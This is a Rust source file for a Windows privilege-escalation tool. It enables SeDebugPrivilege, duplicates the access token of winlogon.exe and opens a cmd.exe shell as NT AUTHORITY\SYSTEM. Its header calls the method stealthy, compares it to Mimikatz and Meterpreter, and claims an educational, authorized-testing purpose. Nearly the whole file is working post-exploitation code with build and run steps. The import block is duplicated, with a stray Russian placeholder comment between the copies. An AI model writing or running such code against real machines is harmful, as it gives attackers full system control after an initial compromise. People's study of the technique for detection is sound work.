//! # Token Impersonation: Elevate to NT AUTHORITY\SYSTEM
//!
//! **Author**: Based on community research | Stealthy, no service creation  
//! **Language**: Rust  
//! **Target**: Windows x86_64  
//!
//! ## Description
//!
//! This binary demonstrates token impersonation to escalate privileges from
//! an Administrator account to `NT AUTHORITY\SYSTEM` by:
//!
//! 1. Enabling `SeDebugPrivilege` to access system processes.
//! 2. Finding `winlogon.exe` (running as SYSTEM) via process enumeration.
//! 3. Opening its access token and duplicating it as a primary token.
//! 4. Spawning a new process (e.g., `cmd.exe`) using `CreateProcessWithTokenW`.
//!
//! This technique is commonly used in post-exploitation frameworks (e.g., Mimikatz, Meterpreter)
//! and does not require kernel exploits or service creation, making it stealthier than SCM-based methods.
//!
//! ## Usage
//!
//! ```cmd
//! # Build
//! cargo build --release
//!
//! # Run as Administrator
//! .\target\release\runassystem.exe
//! ```
//!
//! A new `cmd.exe` will start running as `NT AUTHORITY\SYSTEM`.
//!
//! ## Requirements
//!
//! - Administrator privileges (to enable `SeDebugPrivilege`)
//! - Windows 7 or later
//! - Rust toolchain (for compilation)
//!
//! ## Notes
//!
//! - Uses Microsoft's official [`windows-rs`](https://github.com/microsoft/windows-rs) crate.
//! - Designed for educational and authorized security testing.
//! - May be flagged by EDR/AV due to token manipulation APIs.
//!

use windows::{
    core::*,
    Win32::{
        Foundation::*,
        Security::*,
        System::{
            Diagnostics::ToolHelp::*,
            Threading::*,
        },
    },
};

// ... остальной код
use windows::{
    core::*,
    Win32::{
        Foundation::*,
        Security::*,
        System::{
            Diagnostics::ToolHelp::*,
            Threading::*,
        },
    },
};

fn enable_debug_privilege() -> Result<()> {
    unsafe {
        let mut token_handle: HANDLE = std::mem::zeroed();
        if OpenProcessToken(
            GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
            &mut token_handle,
        ).is_ok() {
            let mut luid = LUID::default();
            if LookupPrivilegeValueW(None, w!("SeDebugPrivilege"), &mut luid).is_ok() {
                let mut tp = TOKEN_PRIVILEGES::default();
                tp.PrivilegeCount = 1;
                tp.Privileges[0].Luid = luid;
                tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

                AdjustTokenPrivileges(
                    token_handle,
                    false,
                    Some(&tp),
                    0,
                    None,
                    None,
                );
            }
            CloseHandle(token_handle);
        }
    }
    Ok(())
}

fn find_process_by_name(name: &str) -> Result<u32> {
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)?;
        let mut pe: PROCESSENTRY32W = std::mem::zeroed();
        pe.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;

        if Process32FirstW(snapshot, &mut pe).is_ok() {
            loop {
                let exe_name: String = widestring_to_string(&pe.szExeFile);
                if exe_name.eq_ignore_ascii_case(name) {
                    CloseHandle(snapshot);
                    return Ok(pe.th32ProcessID);
                }
                if !Process32NextW(snapshot, &mut pe).is_ok() {
                    break;
                }
            }
        }
        CloseHandle(snapshot);
        Err(Error::from_win32())
    }
}

fn widestring_to_string(wstr: &[u16]) -> String {
    let len = wstr.iter().position(|&c| c == 0).unwrap_or(wstr.len());
    String::from_utf16_lossy(&wstr[..len])
}

fn main() -> Result<()> {
    println!("[*] Enabling SeDebugPrivilege...");
    if let Err(e) = enable_debug_privilege() {
        eprintln!("[-] Failed to enable debug privilege: {:?}", e);
        return Err(e);
    }

    println!("[*] Finding winlogon.exe...");
    let pid = match find_process_by_name("winlogon.exe") {
        Ok(pid) => {
            println!("[+] Found winlogon.exe PID: {}", pid);
            pid
        }
        Err(e) => {
            eprintln!("[-] Could not find winlogon.exe: {:?}", e);
            return Err(e);
        }
    };

    let h_process = unsafe {
        OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid)?
    };

    let mut h_token: HANDLE = unsafe { std::mem::zeroed() };
    if !unsafe { OpenProcessToken(h_process, TOKEN_QUERY | TOKEN_DUPLICATE, &mut h_token) }.is_ok() {
        eprintln!("[-] OpenProcessToken failed");
        return Err(Error::from_win32());
    }

    let mut h_primary_token: HANDLE = unsafe { std::mem::zeroed() };
    if !unsafe {
        DuplicateTokenEx(
            h_token,
            TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_QUERY
                | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID,
            None,
            SecurityImpersonation,
            TokenPrimary,
            &mut h_primary_token,
        )
    }.is_ok() {
        eprintln!("[-] DuplicateTokenEx failed");
        return Err(Error::from_win32());
    }

    let mut si: STARTUPINFOW = unsafe { std::mem::zeroed() };
    si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
    let mut pi: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };

    let mut cmd_line: Vec<u16> = "cmd.exe\0".encode_utf16().collect();

    let result = unsafe {
        CreateProcessWithTokenW(
            h_primary_token,
            CREATE_PROCESS_LOGON_FLAGS(0),
            None,
            PWSTR(cmd_line.as_mut_ptr()),
            CREATE_NEW_CONSOLE,
            None,
            None,
            &si,
            &mut pi,
        )
    };

    if result.is_ok() {
        println!("[+] SYSTEM shell started! PID: {}", pi.dwProcessId);
        unsafe {
            WaitForSingleObject(pi.hProcess, INFINITE);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    } else {
        eprintln!("[-] CreateProcessWithTokenW failed: {:?}", result.as_ref().err());
        return Err(result.err().unwrap());
    }

    unsafe {
        CloseHandle(h_token);
        CloseHandle(h_primary_token);
        CloseHandle(h_process);
    }

    Ok(())
}
